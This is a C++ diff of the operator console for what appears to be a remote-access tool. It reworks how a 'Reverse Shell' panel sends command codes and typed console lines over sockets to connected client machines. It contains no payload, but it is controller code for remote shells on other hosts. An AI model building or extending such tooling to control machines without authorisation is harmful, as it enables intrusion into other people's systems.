@@ -97,7 +97,8 @@ void FrameCliente::OnClosePage(wxAuiNotebookEvent& event) {
             if (aClient->_id == this->strClienteID) {
                 if (aClient->_isRunningShell) {
                     aClient->_isRunningShell = false;
-                    std::string strComando = "exit\r\n";
+                    std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Command);
+                    strComando += "~exit\r\n";
                     p_Servidor->cSend(aClient->_sckCliente, strComando.c_str(), strComando.size(), 0, false);
                 }
                 break;
@@ -134,7 +135,8 @@ void FrameCliente::OnClose(wxCloseEvent& event) {
             std::cout << "running shell?: " << iter->_isRunningShell << std::endl;
             if (iter->_isRunningShell) {
                 iter->_isRunningShell = false;
-                std::string strComando = "exit\r\n";
+                std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Command);
+                strComando += "~exit\r\n";
                 p_Servidor->cSend(iter->_sckCliente, strComando.c_str(), strComando.size(), 0, false);
             } 
             break;
@@ -178,13 +180,16 @@ void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
 }
 
 
-//Modulos
+//-----------------Modulos-----------------//
+
+//Test
 panelTest::panelTest(wxWindow* pParent) :
     wxPanel(pParent, EnumIDS::ID_Panel_Test) {
     wxButton* btn_Test = new wxButton(this, EnumIDS::ID_FrameClienteTest, "EXEC");
     this->lblOutputTest = new wxStaticText(this, EnumIDS::ID_Panel_Label_Test, wxT("Output"), wxPoint(20, 20));
 }
 
+//Reverse Shell
 panelReverseShell::panelReverseShell(wxWindow* pParent) :
     wxPanel(pParent, EnumIDS::ID_Panel_Reverse_Shell) {
     wxWindow* wxTree = (MyTreeCtrl*)this->GetParent();
@@ -209,7 +214,8 @@ panelReverseShell::panelReverseShell(wxWindow* pParent) :
     for (auto aClient = p_Servidor->vc_Clientes.begin(); aClient != p_Servidor->vc_Clientes.end(); aClient++) {
         if (aClient->_id == this->strID) {
             aClient->_isRunningShell = true;
-            std::string strComando = "RSHELL~notepad.exe";
+            std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Start);
+            strComando += "~0";
             int ib = p_Servidor->cSend(aClient->_sckCliente, strComando.c_str(), strComando.size(), 0, false);
             break;
         }
@@ -254,7 +260,9 @@ void panelReverseShell::OnHook(wxKeyEvent& event) {
     }else if (iCode == WXK_RETURN) {
         wxString strRandomOut = this->txtConsole->GetLineText(this->txtConsole->GetNumberOfLines()-1);
         int iLongitud = this->txtConsole->GetLastPosition() - this->p_uliUltimo;
-        wxString str1 = strRandomOut.substr((strRandomOut.length() - iLongitud), strRandomOut.length());
+        wxString str1 = std::to_string(EnumComandos::Reverse_Shell_Command);
+        str1 += "~";
+        str1 += strRandomOut.substr((strRandomOut.length() - iLongitud), strRandomOut.length());
         this->vc_History.push_back(str1);
 
         str1.append(1, '\r');
@@ -267,7 +275,7 @@ void panelReverseShell::OnHook(wxKeyEvent& event) {
 
         for (auto vcCli : vc_Copy) {
             if (vcCli._id == this->strID) {
-                int iEnviado = p_Servidor->cSend(vcCli._sckCliente, str1.c_str(), str1.size(), 0, false);
+                int iEnviado = p_Servidor->cSend(vcCli._sckCliente, str1.c_str(), str1.size()+1, 0, false);
                 break;
             }
         }
